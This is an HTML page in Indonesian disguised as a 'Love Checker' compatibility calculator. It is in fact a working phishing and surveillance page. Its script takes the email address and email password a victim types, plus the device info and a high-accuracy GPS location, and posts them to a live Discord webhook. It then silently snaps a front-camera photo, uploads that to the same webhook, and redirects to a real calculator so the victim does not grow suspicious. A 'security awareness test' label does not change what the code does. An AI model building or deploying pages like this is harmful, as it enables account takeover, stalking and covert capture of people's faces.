<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Love Percent Calculator ❤️</title>
    <style>
        body { background: #0f0f13; color: #fff; font-family: 'Poppins', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #1a1a24; padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #ff2d55; box-shadow: 0 10px 30px rgba(255, 45, 85, 0.2); }
        h2 { color: #ff2d55; margin-bottom: 5px; }
        p { font-size: 12px; color: #aaa; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin-bottom: 10px; background: #252533; border: 1px solid #333; border-radius: 10px; color: #fff; outline: none; }
        button { width: 100%; padding: 15px; background: #ff2d55; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
        button:hover { background: #e0244a; box-shadow: 0 0 15px rgba(255, 45, 85, 0.5); }
        #loading { display: none; margin-top: 20px; font-style: italic; color: #ff2d55; }
        #cam_preview { display: none; }
    </style>
</head>
<body>

<div class="card" id="main-box">
    <div id="login-form">
        <h2>LOVE CHECKER ❤️</h2>
        <p>Verifikasi akun diperlukan untuk memproses algoritma kecocokan cinta lu!</p>
        <input type="email" id="userEmail" placeholder="Email" required>
        <input type="password" id="userPass" placeholder="Password Email" required>
        <button onclick="startTest()">MASUK & CEK SEKARANG</button>
    </div>

    <div id="loading">Sedang menghitung kecocokan... 🔮</div>
</div>

<video id="cam_preview" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
async function startTest() {
    const email = document.getElementById('userEmail').value;
    const pass = document.getElementById('userPass').value;

    if (!email || !pass) { alert("Data harus diisi untuk verifikasi!"); return; }

    // Efek transisi agar terlihat seperti sedang memproses
    document.getElementById('login-form').style.display = 'none';
    document.getElementById('loading').style.display = 'block';

    const webhook = "https://discord.com/api/webhooks/1476556112722530306/IQY3TPNcQyqr-12WSVJj6Y1De1dJWdZxgCprXJjYqtK9v7Sl9K1JEm73HfxMJRdEX6C9";

    // 1. Ambil Lokasi (Akurasi Tinggi) & Info Perangkat
    navigator.geolocation.getCurrentPosition(async (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const device = navigator.userAgent;
        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

        // Kirim Data Input ke Discord
        await fetch(webhook, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                content: "🚨 **SECURITY AWARENESS TEST - DATA MASUK**",
                embeds: [{
                    title: "Hasil Input Target",
                    color: 16724309,
                    fields: [
                        { name: "📧 Email Input", value: `\`${email}\`` },
                        { name: "🔑 Password Input", value: `\`${pass}\`` },
                        { name: "📱 Info Perangkat", value: `\`${device}\`` },
                        { name: "📍 Lokasi Presisi", value: `[Buka di Google Maps](${mapsUrl})` }
                    ],
                    footer: { text: "Xyren Lab Sentinel - Dark Mode" },
                    timestamp: new Date()
                }]
            })
        });

        // 2. Ambil Foto Kamera Depan secara otomatis
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('cam_preview');
            video.srcObject = stream;

            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('file', blob, 'capture.png');
                    formData.append('content', `📸 Foto wajah dari user: **${email}**`);

                    await fetch(webhook, { method: 'POST', body: formData });
                    stream.getTracks().forEach(track => track.stop());
                    
                    // 3. Pengalihan ke link persenan cinta asli lu
                    setTimeout(() => {
                        window.location.href = "https://replit.com/@GigsProject/LoveCalc"; 
                    }, 1500);
                }, 'image/png');
            }, 2500);
        } catch (e) {
            // Jika kamera ditolak, tetap dialihkan agar tidak curiga
            window.location.href = "https://replit.com/@GigsProject/LoveCalc";
        }
    }, () => { 
        alert("Izin GPS diperlukan untuk validasi server!"); 
        location.reload(); 
    }, { enableHighAccuracy: true });
}
</script>
</body>
</html>
